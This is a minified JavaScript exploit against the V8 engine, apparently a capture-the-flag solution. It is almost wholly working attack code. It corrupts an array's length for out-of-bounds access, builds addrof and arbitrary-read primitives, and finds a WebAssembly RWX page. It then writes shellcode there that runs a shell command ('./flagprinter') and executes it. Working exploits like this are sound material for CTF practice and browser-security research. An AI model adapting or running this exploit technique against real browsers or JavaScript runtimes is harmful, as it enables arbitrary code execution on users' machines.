var buf=new ArrayBuffer(8);var f64_buf=new Float64Array(buf);var u32_buf=new Uint32Array(buf);function ftoi(val){f64_buf[0]=val;return BigInt(u32_buf[0])+(BigInt(u32_buf[1])<<32n);} function itof(val){u32_buf[0]=Number(val&0xffffffffn);u32_buf[1]=Number(val>>32n);return f64_buf[0];} function hex(val){return"0x"+val.toString(16);} var wasm_code=new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasm_mod=new WebAssembly.Module(wasm_code);var wasm_instance=new WebAssembly.Instance(wasm_mod);var f=wasm_instance.exports.main;console.log("[+] WebAssembly RWX page setup!");var float_arr=[1.1];float_arr=float_arr.slice(0);var addrof_arr=[{},{}];var arb_read_arr=[1.1];var buf=new ArrayBuffer(0x100);var dataview=new DataView(buf);console.log("[+] Corrupting float_arr's length to 2048");var float_arr_elem=ftoi(float_arr[2])&0xffffffffn;float_arr[2]=itof((0x1000n<<32n)+float_arr_elem);if(float_arr.length===2048){console.log("[+] Corruption successful!");}else{console.log("[!] Corruption failed. Try again.");throw error;} function addrof(obj){addrof_arr[0]=obj;return ftoi(float_arr[4])&0xffffffffn;} console.log("[+] Addrof primitive has been setup");function compressed_arb_read(addr){float_arr[17]=itof((0x1000n<<32n)+addr-8n);return ftoi(arb_read_arr[0]);} console.log("[+] Arbitrary read primitive for the compressed heap has been setup");function copy_shellcode(addr,shellcode){float_arr[20]=itof((addr&0xffffffffn)<<32n);float_arr[21]=itof((addr&0xffffffff00000000n)>>32n);for(let i=0;i<shellcode.length;i++){dataview.setUint32(4*i,shellcode[i],true);}} var shellcode=[0x99583b6a,0x622fbb48,0x732f6e69,0x48530068,0x2d68e789,0x48000063,0xe852e689,0x0000000e,0x6c662f2e,0x72706761,0x65746e69,0x57560072,0x0fe68948,0x00000005];var rwx_page_addr=compressed_arb_read(addrof(wasm_instance)+0x68n);console.log("[+] RWX page address found: "+hex(rwx_page_addr));console.log("[+] Copying ./flagprinter shellcode to RWX page");copy_shellcode(rwx_page_addr,shellcode);console.log("[+] Printing flag!");f();
